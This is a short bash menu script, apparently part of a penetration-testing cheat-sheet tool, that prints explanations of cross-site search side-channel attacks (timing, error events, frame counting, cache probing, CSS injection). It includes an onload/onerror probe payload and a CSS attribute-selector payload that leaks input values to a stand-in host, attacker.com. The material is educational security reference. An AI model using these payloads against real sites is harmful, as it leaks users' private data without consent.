#!/bin/bash
# HackTricks Ref: xs-search.md
# Module: Cross-Site Search (XS-Search) & Side-Channel Attacks

echo -e "${C6}[WEB ATTACK: XS_SEARCH]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/xs-search"
echo -e "--------------------------------------------------"

echo -e "${C4}Select XS-Search Vector:${NC}"
echo "1) Timing Attack (Response Time Difference)"
echo "2) Error-Based Search (Status Code Reflection)"
echo "3) Window Count / Frame Counting Attack"
echo "4) Cache-Based Side Channel"
echo "5) CSS Injection Search (Binary Search style)"
echo "0) Exit"

read -p "Selection: " xs_opt

case $xs_opt in
    1)
        echo -e "\n${C2}[*] Timing-Based XS-Search:${NC}"
        echo "Goal: Determine if a search query has results based on how long the server takes to respond."
        echo "Method: Use 'performance.now()' in JS to measure the time it takes to load a search URL in a background tag (img/script)."
        echo "Example: If 'search?q=admin' takes 500ms and 'search?q=xyz' takes 100ms, 'admin' likely exists."
        ;;
    2)
        echo -e "\n${C2}[*] Error-Based XS-Search:${NC}"
        echo "If the server returns 200 OK for results and 404 for 'no results':"
        echo "Use the 'onload' and 'onerror' events on a sub-resource tag."
        echo "Payload: <script src=\"https://target.com/search?q=a\" onload=\"found()\" onerror=\"notfound()\"></script>"
        ;;
    3)
        echo -e "\n${C2}[*] Frame Counting:${NC}"
        echo "Check if the search page embeds results in iframes."
        echo "An attacker can open 'search?q=flag' in a window and check 'window.length'."
        echo "If 'window.length' is 5, there are 5 result frames. If 0, no results found."
        ;;
    4)
        echo -e "\n${C2}[*] Cache Attack:${NC}"
        echo "1. Force the victim's browser to cache a specific search result."
        echo "2. Later, try to load that resource. If it loads instantly, the user had previously searched for that term."
        ;;
    5)
        echo -e "\n${C2}[*] CSS Injection Search:${NC}"
        echo "If you have limited CSS injection, use attribute selectors to leak data:"
        echo "Payload: input[value^='a'] { background: url('//attacker.com/leak/a'); }"
        echo "This leaks the value character by character as the background is loaded."
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
